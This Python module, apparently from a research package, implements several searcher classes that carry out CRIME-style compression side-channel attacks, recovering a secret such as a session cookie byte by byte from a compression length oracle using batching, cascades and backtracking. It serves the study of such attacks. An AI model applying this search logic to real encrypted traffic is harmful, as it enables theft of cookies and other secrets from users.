from collections import defaultdict
from collections.abc import Callable
from itertools import chain
from random import Random
from statistics import mean
from typing import Sequence

from ..automata import CRIMEAutomaton
from .oracle import CompressionLengthOracle
from .models import AutomatonModel

from ..utils import EPS


class Searcher:
    def __init__(
        self,
        model: AutomatonModel,
        oracle: CompressionLengthOracle | None,
        max_queries: int | None,
        recompile: bool,
        strict: bool,
        truncate_target: int | None,
    ):
        self.model = model
        self.oracle = oracle
        self.max_queries = max_queries
        self.recompile = recompile
        self.strict = strict
        self.num_queries: int = 0
        self.max_query_len: int = 0
        self.truncate_target: int | None = truncate_target

    def set_oracle(self, oracle: CompressionLengthOracle) -> None:
        self.oracle = oracle

    def set_max_queries(self, max_queries: int | None) -> None:
        self.max_queries = max_queries

    def reset_stats(self) -> None:
        self.num_queries = 0
        self.max_query_len = 0

    def flush(self) -> None:
        self.model.flush()

    @staticmethod
    def _split_into_buckets(candidates: bytes, n: int) -> list[bytes]:
        buckets = [bytearray() for _ in range(n)]
        for i, c in enumerate(candidates):
            buckets[i % n].append(c)
        return [bytes(bucket) for bucket in buckets]

    def _truncate(self, target: bytes) -> bytes:
        l = self.truncate_target
        if l is None:
            return target
        elif l > 0:
            return target[:l]
        else:
            return target[l:]

    def _gen_query(
        self, targets: list[bytes] | list[list[bytes]], rng: Random | None
    ) -> bytes | None:
        query = None

        targets_mat: list[list[bytes]] = [
            (
                [self._truncate(row)]
                if isinstance(row, bytes)
                else [self._truncate(s) for s in row]
            )
            for row in targets
        ]  # use a different variable to appease type checker

        while query is None:
            query = self.model(updates=targets_mat, rng=rng, recompile=self.recompile)
            if not self.strict:
                break
            elif query is None:
                self.flush()
        return query

    def _call_oracle(self, query: bytes) -> int:
        """A thin wrapper of `oracle()` that also collects stats on `query`."""
        assert self.oracle is not None, "missing oracle"
        if self.max_queries is not None and self.num_queries >= self.max_queries:
            return 0
        self.num_queries += 1
        self.max_query_len = max(self.max_query_len, len(query))
        return self.oracle(query)

    def recover(
        self,
        prefix: bytes,
        alphabet: bytes,
        length: int,
        rng: Random | None,
    ) -> bytes | None:
        """Recover a secret from the compression length oracle.

        Args:

            prefix: A byte string immediately before the secret in data and
                ideally does not appear elsewhere.
            alphabet: The secret alphabet (or a superset of it), namely all
                possible bytes that may appear in the secret.
            length: The length of the secret.
            rng: A random number generator, to be used by the automaton model
                and possibly the searcher itself, or `None`.

        Returns:
            The recovered secret, or `None` if recovery fails. May return
            a prefix.
        """
        raise NotImplementedError()

    def recover_backwards(
        self,
        suffix: bytes,
        alphabet: bytes,
        length: int,
        rng: Random | None,
    ) -> bytes | None:
        raise NotImplementedError()


class SimpleSearcher(Searcher):
    """A very simple cookie recovery attacker.

    The attacker simply tries to recover the cookie byte-by-byte, taking the
    byte that results in a significantly shorter (or longer, depending on
    your setup) oracle response as the guess. If there is no such byte, the
    last recovered byte is discarded (backtracking), or, if there are no
    such bytes, the search aborts.
    """

    def __init__(
        self,
        model: AutomatonModel,
        oracle: CompressionLengthOracle | None,
        max_queries: int | None,
        threshold: int | float,
        repeat: int = 1,
        recompile: bool = False,
        flush_backtrack: bool = True,
        strict: bool = True,
        truncate_target: int | None = None,
    ):
        """Initialize a simple cookie recovery attacker.

        Args:
            model: The CRIME automaton model used by the attacker. In general,
                provide a `CRIMEChainModel` object.
            oracle: The compression length oracle, or `None`. The oracle can be
                specified or changed later using the `set_oracle` method.
            max_queries: The maximum number of queries, or `None`.
            threshold: The threshold used by the attacker to decide whether
                to accept a guess or not. The absolute value of `threshold`
                should be larger than the compressed length difference between
                incorrect guesses but smaller than that between correct and
                incorrect guesses. If a correct guess is expected to yield a
                shorter compressed length, then `threshold` should be positive,
                and vice versa.
            repeat: The number of queries that the attacker perform for each
                guess. Increasing `repeat` can even out noise, but this also
                increases the number of queries performed.
            recompile: Whether to recompile the automaton for different oracle
                queries; default `False`.
            flush_backtrack: Whether to flush the automaton when backtracking;
                default `True`.
            strict: Whether to retry if the model fails to generate some query;
                default `False`.
            truncate_target: Whether or how to truncate the targets.
                By default, `truncate_target` is set to `None`, and the
                targets are not truncated. Else, if `truncate_target` is
                a positive number, then each target will be truncated to a
                prefix of length `truncate_target`. Otherwise, each target
                will be truncated to a suffix of length `-truncate_target`.
        """
        super().__init__(
            model=model,
            oracle=oracle,
            max_queries=max_queries,
            recompile=recompile,
            strict=strict,
            truncate_target=truncate_target,
        )

        self.direction: bool = threshold > 0
        self.threshold: int | float = abs(threshold)
        self.repeat: int = repeat
        self.flush_backtrack: bool = flush_backtrack

    def recover(
        self,
        prefix: bytes,
        alphabet: bytes,
        length: int,
        rng: Random | None,
    ) -> bytes | None:
        assert self.oracle is not None, "missing oracle"
        self.reset_stats()
        recovered = b""
        backtracked: set[bytes] = set()

        while len(recovered) < length:
            best: tuple[int, float] | None = None
            found: bool = False
            # lengths: list[float] = []
            for c in alphabet:
                cur_len, local_num_queries = 0.0, 0
                for _ in range(self.repeat):
                    query = self._gen_query([prefix + recovered + bytes([c])], rng)
                    if query is None:
                        continue
                    local_num_queries += 1
                    if (
                        self.max_queries is not None
                        and self.num_queries >= self.max_queries
                    ):
                        return recovered
                    cur_len += self._call_oracle(query)

                if local_num_queries == 0:  # no data point at all
                    return None
                cur_len /= local_num_queries
                # lengths.append(cur_len)
                if best is None:
                    best = (c, cur_len)
                else:
                    diff = abs(best[1] - cur_len)
                    if (best[1] > cur_len) == self.direction:
                        best = (c, cur_len)
                    if diff >= self.threshold:  # no indent!
                        found = True
                        break

            if found:
                assert best is not None  # please mypy
                recovered = recovered + bytes([best[0]])
                if b"" in backtracked:
                    backtracked.remove(b"")
            else:  # backtracking
                if self.flush_backtrack:
                    self.flush()
                if len(recovered) > 0:
                    if recovered in backtracked and best is not None:
                        # probably not a good idea to backtrack once more
                        backtracked.remove(recovered)
                        recovered = recovered + bytes([best[0]])
                    else:
                        backtracked.add(recovered)
                        recovered = recovered[:-1]
                else:
                    # The situation now is a bit unfortunate.
                    # Let's pretend nothing happend
                    pass

        return recovered


class BatchSearcherTreeNode:
    def __init__(
        self,
        parent: "BatchSearcherTreeNode | None",
        candidates: bytes,
        split_cands: Callable[[bytes], list[bytes]],
    ):
        self.parent = parent
        self.candidates = candidates
        self.ch: list[BatchSearcherTreeNode] | None = None
        ch_cands_ls = split_cands(candidates)
        if len(ch_cands_ls) > 0:
            self.ch = [
                BatchSearcherTreeNode(self, ch_cands, split_cands)
                for ch_cands in ch_cands_ls
            ]


class SimpleBatchSearcher(Searcher):
    """A simple cookie recovery attacker that performs parallel search.

    The main difference to `SimpleSearcher` is that this attacker is able to
    query multiple targets at the same time. The attacker recovers the secret
    byte-by-byte. For each target byte, the attacker keeps a set of candidates.
    In each round, the attacker groups the candidate evenly into some buckets,
    and tests each subgroup with a single query, until a compressed length
    difference larger than the threshold (accounting for the fact that some
    buckets may have one more candiate than the other) is observed. Then, the
    attacker takes the best bucket as the new set of candidates and repeats
    the above process, until arriving at a bucket of only one candidate.
    The method of dividing candidates into buckets is optimized using DP.
    """

    def __init__(
        self,
        model: AutomatonModel,
        oracle: CompressionLengthOracle | None,
        max_queries: int | None,
        threshold: int | float,
        max_cands: int | None,
        ormatch_comp_len: int,
        repeat: int = 1,
        recompile: bool = False,
        flush_backtrack: bool = True,
        flush_repeat: bool = False,
        strict: bool = True,
        truncate_target: int | None = None,
        use_history: bool = False,
    ):
        """Initialize a simple batch cookie recovery attacker.

        Args:
            model: The CRIME automaton model used by the attacker. In general,
                provide a `CRIMESlideModel` object.
            oracle: The compression length oracle, or `None`. The oracle can be
                specified or changed later using the `set_oracle` method.
            max_queries: The maximum number of queries, or `None`.
            threshold: The threshold used by the attacker to decide whether
                to accept a guess or not. The absolute value of `threshold`
                should be larger than the compressed length difference between
                incorrect guesses but smaller than that between correct and
                incorrect guesses. If a correct guess is expected to yield a
                shorter compressed length, then `threshold` should be positive,
                and vice versa.
            max_cands: The maximum number of candidates allowed in a single
                query, or `None`, in which case there will be no such limit.
            ormatch_comp_len: The estimated increase in compressed length with
                every added or-match gadget.
            repeat: The number of queries that the attacker perform for each
                guess. Increasing `repeat` can even out noise, but this also
                increases the number of queries performed.
            recompile: Whether to recompile the automaton for different oracle
                queries; default `False`.
            flush_backtrack: Whether to flush the automaton when backtracking;
                default `True`.
            flush_repeat: Whether to flush the automaton when repeating a
                round of guess for a target byte; default `False`.
            strict: Whether to retry if the model fails to generate some query;
                default `False`.
            truncate_target: Whether or how to truncate the targets.
                By default, `truncate_target` is set to `None`, and the
                targets are not truncated. Else, if `truncate_target` is
                a positive number, then each target will be truncated to a
                prefix of length `truncate_target`. Otherwise, each target
                will be truncated to a suffix of length `-truncate_target`.
            use_history: Whether to use past queries to optimize the number
                of queries; default `False`.
        """
        super().__init__(
            model=model,
            oracle=oracle,
            max_queries=max_queries,
            recompile=recompile,
            strict=strict,
            truncate_target=truncate_target,
        )

        assert max_cands is None or max_cands >= 1
        assert repeat >= 1

        self.direction: bool = threshold > 0
        self.threshold: int | float = abs(threshold)
        self.max_cands: int | None = max_cands
        self.ormatch_comp_len: int = ormatch_comp_len
        self.repeat: int = repeat
        self.flush_backtrack: bool = flush_backtrack
        self.flush_repeat: bool = flush_repeat
        self.use_history: bool = use_history

        self.histories: list[list[list[float]]] = []
        self.split_table: list[tuple[int, int]] = [(0, 0), (0, 0)]
        self.split_threshold: int | None = None

    def _split_cands(self, candidates: bytes) -> list[bytes]:
        l = len(candidates)
        if l == 1:
            return []
        else:
            num_ch = self.split_table[l][0]
            return self._split_into_buckets(candidates, num_ch)

    def _split_cands_with_hist(self, candidates: bytes) -> list[bytes]:
        l = len(candidates)
        if l == 1:
            return []
        else:
            if self.max_cands is None:
                num_ch = 2
            else:
                num_ch = max(2, (l + self.max_cands - 1) // self.max_cands)
            return self._split_into_buckets(candidates, num_ch)

    def _compute_split_table(self, m: int) -> None:
        if self.split_threshold == self.max_cands:  # cached
            m0 = len(self.split_table)
        else:
            self.split_table = [(0, 0), (0, 0)]
            m0 = 2
        for i in range(m0, m + 1):
            best: tuple[int, int] | None = None
            for k in range(2, i + 1):
                low_size = i // k
                high_size = low_size + int((i % k) != 0)
                if self.max_cands is not None and high_size > self.max_cands:
                    continue
                ch_cost_low = self.split_table[low_size][1]
                ch_cost_high = self.split_table[high_size][1]
                high_count = i % k
                low_count = k - high_count
                # calculate costs
                rec_cost = high_count * ch_cost_high + low_count * ch_cost_low
                high_cost = high_size * (2 + high_count * (high_count + 1)) // 2
                low_cost = low_size * low_count * (high_count + k + 1) // 2
                cost = rec_cost + high_cost + low_cost
                # print(i, k, rec_cost, high_cost, low_cost, cost)
                if best is None or best[1] > cost:
                    best = (k, cost)

            assert best is not None
            self.split_table.append(best)

    def _expected_num_queries(self, alphabet: bytes) -> float:
        """Return the expected number of queries to recover a character.

        Roughly, f(n) = f(n/k) + (k+1)/2 + (1/k) = log_k(n) * ((k+1)/2 + (1/k))
        """
        self._compute_split_table(len(alphabet))
        root = BatchSearcherTreeNode(None, alphabet, self._split_cands)

        def expected_num_queries_at(node: BatchSearcherTreeNode):
            m = len(node.candidates)
            if node.ch is None:
                assert m == 1
                return 0
            avg = 0.0
            for i, ch_node in enumerate(node.ch):
                p = len(ch_node.candidates) / m
                ch_avg = expected_num_queries_at(ch_node)
                avg += p * (ch_avg + max(i + 1, 2))
            assert abs(avg - self.split_table[m][1] / m) < EPS
            return avg

        return expected_num_queries_at(root)

    def _get_baseline_from_histories(self, num_cands_ls: Sequence[int]) -> float | None:
        assert len(num_cands_ls) > 0
        his = list(
            chain(*(chain(*self.histories[num_cands]) for num_cands in num_cands_ls))
        )
        if len(his) == 0:
            return None

        # l_l, l_m, l_r = len(his_l), len(his_m), len(his_r)
        # l = l_l + l_m + l_r
        # if l == 0:  # no history
        #    return None

        # mean_l = mean(his_l) + self.ormatch_comp_len if l_l > 0 else 0
        # mean_m = mean(his_m) if l_m > 0 else 0
        # mean_r = mean(his_r) - self.ormatch_comp_len if l_r > 0 else 0
        # return (mean_l * l_l + mean_m + l_m + mean_r * l_r) / l

        return mean(his)

    def _summarize_histories(self) -> list[tuple[int, float]]:
        baseline_ls: list[tuple[int, float]] = []
        for i in range(len(self.histories)):
            baseline = self._get_baseline_from_histories((i,))
            if baseline is not None:
                baseline_ls.append((i, baseline))
        return baseline_ls

    def _remove_history_at(self, idx: int) -> None:
        if idx < 0:
            return
        for i, history in enumerate(self.histories):
            if len(history[idx]) > 0:
                self.histories[i][idx] = []

    def recover(
        self,
        prefix: bytes,
        alphabet: bytes,
        length: int,
        rng: Random | None,
    ) -> bytes | None:
        assert self.oracle is not None, "missing oracle"
        self.reset_stats()
        recovered = b""
        recovered_nodes: list[BatchSearcherTreeNode] = []
        backtracked: set[tuple[bytes, BatchSearcherTreeNode]] = set()
        if not self.use_history:
            self._compute_split_table(len(alphabet))
            split_cands = self._split_cands
        else:
            self.histories = [
                [[] for _ in range(length)] for _ in range(len(alphabet) + 2)
            ]
            split_cands = self._split_cands_with_hist
        root = BatchSearcherTreeNode(None, alphabet, split_cands)

        while len(recovered) < length:
            cur_node = root
            repeated: bool = False
            while cur_node.ch is not None:
                recovered_len = len(recovered)
                best: tuple[BatchSearcherTreeNode | None, float] | None = None
                if self.use_history:
                    num_ch_1 = len(cur_node.ch[0].candidates)
                    num_ch_2 = len(cur_node.ch[-1].candidates)
                    baseline = self._get_baseline_from_histories((num_ch_1, num_ch_2))
                    if baseline is not None:
                        best = (None, baseline)
                found: bool = False
                for idx, ch_node in enumerate(cur_node.ch):
                    if (
                        self.use_history
                        and baseline is not None
                        and idx + 1 == len(cur_node.ch)
                        and ch_node.ch is not None
                    ):
                        best = (ch_node, -1)
                        found = True
                        break
                    cur_len, local_num_queries = 0.0, 0
                    updates = [
                        prefix + recovered + bytes([c]) for c in ch_node.candidates
                    ]
                    for _ in range(self.repeat):
                        query = self._gen_query([updates], rng)
                        if query is None:
                            continue
                        local_num_queries += 1
                        if (
                            self.max_queries is not None
                            and self.num_queries >= self.max_queries
                        ):
                            return recovered
                        cur_len += self._call_oracle(query)

                    if local_num_queries == 0:  # no data point at all
                        return None
                    cur_len /= local_num_queries
                    # counter the effect of more/fewer or_match gadgets
                    cur_len -= (1 + self.ormatch_comp_len) * (len(updates) - 1)
                    # print(ch_node.candidates, cur_len, best[1] if best is not None else None)
                    if self.use_history:
                        self.histories[len(ch_node.candidates)][recovered_len].append(
                            cur_len
                        )
                    if best is None:
                        best = (ch_node, cur_len)
                    else:
                        diff = abs(best[1] - cur_len)
                        if (best[1] > cur_len) == self.direction:
                            best = (ch_node, cur_len)
                        if diff >= self.threshold:  # no indent!
                            found = best[0] is not None
                            break

                cur_state = (recovered, cur_node)
                if found:
                    assert best is not None  # please mypy
                    assert best[0] is not None  # please please please
                    cur_node = best[0]
                    repeated = False
                    if cur_state in backtracked:
                        backtracked.remove(cur_state)
                    if self.use_history and best[1] > 0:
                        try:
                            self.histories[len(cur_node.candidates)][
                                recovered_len
                            ].remove(best[1])
                        except ValueError as e:
                            raise e
                elif not repeated:
                    repeated = True
                    # print("[repeat]", recovered, cur_node.candidates)
                    if self.use_history:
                        self._remove_history_at(recovered_len)
                    if self.flush_repeat:
                        self.flush()
                else:  # backtracking
                    # print("[backtrack]", recovered, cur_node.candidates)
                    repeated = False
                    if self.use_history:
                        self._remove_history_at(recovered_len)
                    if self.flush_backtrack:
                        self.flush()
                    if cur_state in backtracked:
                        if self.use_history and recovered_len > 0:
                            # remove current guess
                            self._remove_history_at(recovered_len - 1)
                            recovered = recovered[:-1]
                            cur_node = recovered_nodes.pop()
                            assert cur_node.parent is not None
                            cur_node = cur_node.parent
                        elif best is not None and best[0] is not None:
                            # probably not a good idea to backtrack once more
                            backtracked.remove(cur_state)
                            cur_node = best[0]
                    else:
                        backtracked.add(cur_state)
                        if cur_node.parent is None:
                            if len(recovered) == 0:
                                # The situation now is a bit unfortunate.
                                # Let's just try again, OK?
                                pass
                            else:
                                # remove current guess
                                recovered = recovered[:-1]
                                cur_node = recovered_nodes.pop()
                                assert cur_node.parent is not None
                                cur_node = cur_node.parent
                        else:  # move up one level
                            cur_node = cur_node.parent
            assert len(cur_node.candidates) == 1
            recovered += cur_node.candidates
            recovered_nodes.append(cur_node)
            # if self.use_history:
            #    print(recovered, self._summarize_histories())

        return recovered


class CascadeSearcherTreeNode:
    def __init__(
        self,
        parent: "CascadeSearcherTreeNode | None",
        candidates_ls: list[bytes],
        split_cands: Callable[[bytes], list[list[bytes]]],
    ):
        self.parent = parent
        self.candidates_ls = candidates_ls
        self.candidates = b"".join(candidates_ls)

        self.ch: list[CascadeSearcherTreeNode] | None = None
        self.step_ch: list[CascadeSearcherTreeNode] | None = None

        ch_cands_ls = split_cands(self.candidates)
        if len(ch_cands_ls) > 1:
            self.ch = [
                CascadeSearcherTreeNode(self, ch_cands, split_cands)
                for ch_cands in ch_cands_ls
            ]
        elif len(ch_cands_ls) == 1:
            self.ch = [self]
            self.candidates_ls = ch_cands_ls[0]

        if len(self.candidates_ls) > 1:
            self.step_ch = [
                CascadeSearcherTreeNode(self, [step_ch_cands], split_cands)
                for step_ch_cands in self.candidates_ls
            ]


class SimpleCascadeSearcher(Searcher):
    """A simple cookie recovery attacker using CRIME cascades."""

    def __init__(
        self,
        model: AutomatonModel,
        oracle: CompressionLengthOracle | None,
        max_queries: int | None,
        thresholds: list[int | float],
        max_cands: int | None,
        max_cands_per_slot: int | None,
        ormatch_comp_len: int,
        repeat: int = 1,
        recompile: bool = False,
        flush_backtrack: bool = True,
        flush_repeat: bool = False,
        strict: bool = True,
        truncate_target: int | None = None,
        use_baseline: bool = False,
    ):
        """Initialize a simple cascade cookie recovery attacker.

        Args:
            model: The CRIME automaton model used by the attacker. In general,
                provide a `CRIMECascadeModel` object.
            oracle: The compression length oracle, or `None`. The oracle can be
                specified or changed later using the `set_oracle` method.
            max_queries: The maximum number of queries, or `None`.
            thresholds: The thresholds used by the attacker to decide whether
                to accept a guess or not. More specifically, the compressed
                length difference between the case where the i-th slot contains
                the correct candidate and the baseline should be greater or
                equal to `thresholds[i]` (in absolute value), but strictly
                smaller than the `thresholds[i-1]` (in absolute value), if
                `i > 0`. The difference and the thresholds should obviously
                be in the same direction, and `thresholds` should be strictly
                increasing or decreasing.
            max_cands: The maximum number of candidates allowed in a single
                query, or `None`, in which case there will be no such limit.
            max_cands_per_slot: The maximum number of candidates allowed in a
                single slot (before each amplify gadget), or `None`, in which
                case there will be no such limit.
            ormatch_comp_len: The estimated increase in compressed length with
                every added or-match gadget.
            repeat: The number of queries that the attacker perform for each
                guess. Increasing `repeat` can even out noise, but this also
                increases the number of queries performed.
            recompile: Whether to recompile the automaton for different oracle
                queries; default `False`.
            flush_backtrack: Whether to flush the automaton when backtracking;
                default `True`.
            strict: Whether to retry if the model fails to generate some query;
                default `False`.
            truncate_target: Whether or how to truncate the targets.
                By default, `truncate_target` is set to `None`, and the
                targets are not truncated. Else, if `truncate_target` is
                a positive number, then each target will be truncated to a
                prefix of length `truncate_target`. Otherwise, each target
                will be truncated to a suffix of length `-truncate_target`.
            use_baseline: Whether to compute baselines when possible to
                optimize the number of queries; default `False`.
        """
        super().__init__(
            model=model,
            oracle=oracle,
            max_queries=max_queries,
            recompile=recompile,
            strict=strict,
            truncate_target=truncate_target,
        )

        assert max_cands is None or max_cands >= 1
        assert max_cands_per_slot is None or max_cands_per_slot >= 1
        assert repeat >= 1

        self.direction: bool = thresholds[0] > 0
        assert all(
            (thres > 0) == self.direction for thres in thresholds
        )  # enforce one direction

        self.thresholds: list[int | float] = [abs(thres) for thres in thresholds]
        self.max_cands: int | None = max_cands
        self.max_cands_per_slot: int | None = max_cands_per_slot
        self.num_slots: int = len(self.thresholds)
        self.ormatch_comp_len: int = ormatch_comp_len
        self.repeat: int = repeat
        self.flush_backtrack: bool = flush_backtrack
        self.flush_repeat: bool = flush_repeat
        self.use_baseline: bool = use_baseline

        self.baselines: defaultdict[int, list] = defaultdict(list)

    def _split_cands(self, candidates: bytes) -> list[list[bytes]]:
        m = len(candidates)
        if m == 1:
            return []
        query_capacity = m if self.max_cands is None else self.max_cands
        if self.max_cands_per_slot is not None:
            query_capacity = min(
                query_capacity, self.max_cands_per_slot * self.num_slots
            )
        if m <= 2 * query_capacity:
            num_buckets = 2
        else:
            num_buckets = (m + query_capacity - 1) // query_capacity
        buckets = self._split_into_buckets(candidates, num_buckets)
        return [
            self._split_into_buckets(bucket, min(len(bucket), self.num_slots))
            for bucket in buckets
        ]

    def _split_cands_with_baseline(self, candidates: bytes) -> list[list[bytes]]:
        m = len(candidates)
        if m == 1:
            return []
        query_capacity = m if self.max_cands is None else self.max_cands
        if self.max_cands_per_slot is not None:
            query_capacity = min(
                query_capacity, self.max_cands_per_slot * self.num_slots
            )
        if m <= query_capacity:
            num_buckets = 1
        else:
            num_buckets = (m + query_capacity - 1) // query_capacity
        buckets = self._split_into_buckets(candidates, num_buckets)
        return [
            self._split_into_buckets(bucket, min(len(bucket), self.num_slots))
            for bucket in buckets
        ]

    def _get_update_map(self, num_rows: int) -> list[int]:
        """Assign the rows of updates to the slots; there are probably better
        ways to do this, but let's stick to the easiest one for now."""
        assert 1 <= num_rows <= self.num_slots
        min_dist = self.num_slots // num_rows
        return [i * min_dist for i in range(0, num_rows)]

    def _construct_updates(
        self, prefix: bytes, cands_ls: list[bytes], update_map: list[int]
    ) -> tuple[list[list[bytes]], int]:
        updates: list[list[bytes]] = [[] for _ in range(self.num_slots)]
        num_updates: int = 0
        for _, (cands, idx) in enumerate(zip(cands_ls, update_map)):
            updates[idx] = [prefix + bytes([c]) for c in cands]
            num_updates += len(cands)
        return updates, num_updates

    def _get_baseline_at(self, num_cands_ls: Sequence[int]) -> float | None:
        assert len(num_cands_ls) > 0
        his = list(chain(*(self.baselines[num_cands] for num_cands in num_cands_ls)))
        if len(his) == 0:
            return None
        return mean(his)

    def _create_baseline(
        self, cands_ls: list[bytes], prefix: bytes, alphabet: bytes, rng: Random
    ) -> float | None:
        """Create a baseline by slightly modifying the prefix."""
        cur_len, local_num_queries = 0.0, 0
        update_map = self._get_update_map(num_rows=len(cands_ls))
        num_cands = len(b"".join(cands_ls))
        assert len(self.baselines[num_cands]) == 0

        fake_prefix = prefix
        while fake_prefix == prefix:
            # fake_prefix = fake_prefix[:-1] + bytes([rng.choice(alphabet)])
            fake_prefix = bytes([rng.choice(alphabet) for _ in range(len(prefix))])
        updates, num_updates = self._construct_updates(
            fake_prefix, cands_ls, update_map
        )
        for _ in range(self.repeat):
            query = self._gen_query(updates, rng)
            if query is None:
                continue
            local_num_queries += 1
            if self.max_queries is not None and self.num_queries >= self.max_queries:
                return None
            cur_len += self._call_oracle(query)

        if local_num_queries == 0:  # no data point at all
            return None
        cur_len /= local_num_queries
        # counter the effect of more/fewer or_match gadgets
        cur_len -= (1 + self.ormatch_comp_len) * (num_updates - 1)
        self.baselines[num_cands].append(cur_len)
        # print(f"created baseline: ({num_cands}, {cur_len})")
        return cur_len

    def _remove_last_baselines(
        self, num_cands_ls: Sequence[int] | None, k: int = 1
    ) -> None:
        if num_cands_ls is not None:
            for num_cands in num_cands_ls:
                self.baselines[num_cands] = self.baselines[num_cands][:-k]
        else:
            for num_cands, bases in self.baselines.items():
                self.baselines[num_cands] = bases[:-k]

    def recover(
        self,
        prefix: bytes,
        alphabet: bytes,
        length: int,
        rng: Random | None,
    ) -> bytes | None:
        assert self.oracle is not None, "missing oracle"
        assert all(t1 > t2 for t1, t2 in zip(self.thresholds, self.thresholds[1:]))
        assert not (self.use_baseline and rng is None)
        self.reset_stats()

        recovered = b""
        recovered_nodes: list[CascadeSearcherTreeNode] = []
        backtracked: set[tuple[bytes, CascadeSearcherTreeNode]] = set()

        if self.use_baseline:
            self.baselines = defaultdict(list)
            root = CascadeSearcherTreeNode(
                None, [alphabet], self._split_cands_with_baseline
            )
        else:
            root = CascadeSearcherTreeNode(None, [alphabet], self._split_cands)

        while len(recovered) < length:
            cur_node = root
            while cur_node.ch is not None:
                best: (
                    tuple[CascadeSearcherTreeNode | None, float, list[int] | None]
                    | None
                ) = None
                found: bool = False
                diff: float = 0
                if len(cur_node.ch) == 1:
                    assert self.use_baseline and rng is not None
                    num_cands = len(cur_node.candidates)
                    base = self._get_baseline_at(
                        list(range(num_cands - 2, num_cands + 3))
                    )
                    if base is None:
                        base = self._create_baseline(
                            cur_node.ch[0].candidates_ls,
                            prefix + recovered,
                            alphabet,
                            rng,
                        )
                        if base is None:
                            return recovered
                    best = (None, base, None)
                    if (
                        self.max_queries is not None
                        and self.num_queries >= self.max_queries
                    ):
                        return recovered

                for ch_node in cur_node.ch:
                    cur_len, local_num_queries = 0.0, 0
                    cands_ls = ch_node.candidates_ls
                    update_map = self._get_update_map(num_rows=len(cands_ls))
                    updates, num_updates = self._construct_updates(
                        prefix + recovered, cands_ls, update_map
                    )
                    for _ in range(self.repeat):
                        query = self._gen_query(updates, rng)
                        if query is None:
                            continue
                        local_num_queries += 1
                        if (
                            self.max_queries is not None
                            and self.num_queries >= self.max_queries
                        ):
                            return recovered
                        cur_len += self._call_oracle(query)

                    if local_num_queries == 0:  # no data point at all
                        return None
                    cur_len /= local_num_queries
                    # counter the effect of more/fewer or_match gadgets
                    cur_len -= (1 + self.ormatch_comp_len) * (num_updates - 1)
                    # if self.use_baseline:
                    #    self.baselines[len(ch_node.candidates)].append(cur_len)
                    if best is None:
                        best = (ch_node, cur_len, update_map)
                    else:
                        diff = abs(best[1] - cur_len)
                        if (best[1] > cur_len) == self.direction:
                            best = (ch_node, cur_len, update_map)
                        if diff >= self.thresholds[-1]:  # no indent!
                            found = best[0] is not None
                            break
                # print(found, best, cur_len)

                cur_state = (recovered, cur_node)
                if found:
                    assert best is not None  # please mypy
                    assert best[0] is not None and best[2] is not None  # mypy svp
                    cur_node = best[0]
                    if cur_state in backtracked:
                        backtracked.remove(cur_state)
                    # if self.use_baseline:
                    #     self.baselines[len(cur_node.candidates)].remove(best[1])

                    update_map = best[2]
                    if cur_node.step_ch is not None:
                        # utilize extra info to refine search
                        for idx, ch_node in zip(update_map, cur_node.step_ch):
                            if diff >= self.thresholds[idx]:
                                cur_node = ch_node
                                break
                else:  # backtracking
                    # print("[backtrack]", recovered, cur_node.candidates)
                    if self.use_baseline and cur_node.ch is not None:
                        num_cands = len(cur_node.ch[0].candidates)
                        self._remove_last_baselines(
                            num_cands_ls=list(range(num_cands - 2, num_cands + 3)), k=2
                        )
                    if self.flush_backtrack:
                        self.flush()
                    if (
                        cur_state in backtracked
                        and best is not None
                        and best[0] is not None
                    ):
                        # probably not a good idea to backtrack once more
                        backtracked.remove(cur_state)
                        cur_node = best[0]
                    else:
                        backtracked.add(cur_state)
                        if cur_node.parent is None:
                            if len(recovered) == 0:
                                # The situation now is a bit unfortunate.
                                # Let's just try again, OK?
                                pass
                            else:
                                # remove current guess
                                recovered = recovered[:-1]
                                cur_node = recovered_nodes.pop()
                                assert cur_node.parent is not None
                                cur_node = cur_node.parent
                        else:  # move up one level
                            cur_node = cur_node.parent
                        if self.use_baseline and cur_node.ch is not None:
                            num_cands = len(cur_node.ch[0].candidates)
                            self._remove_last_baselines(
                                num_cands_ls=list(range(num_cands - 2, num_cands + 3)),
                                k=2,
                            )
            assert len(cur_node.candidates) == 1
            recovered += cur_node.candidates
            recovered_nodes.append(cur_node)

        return recovered
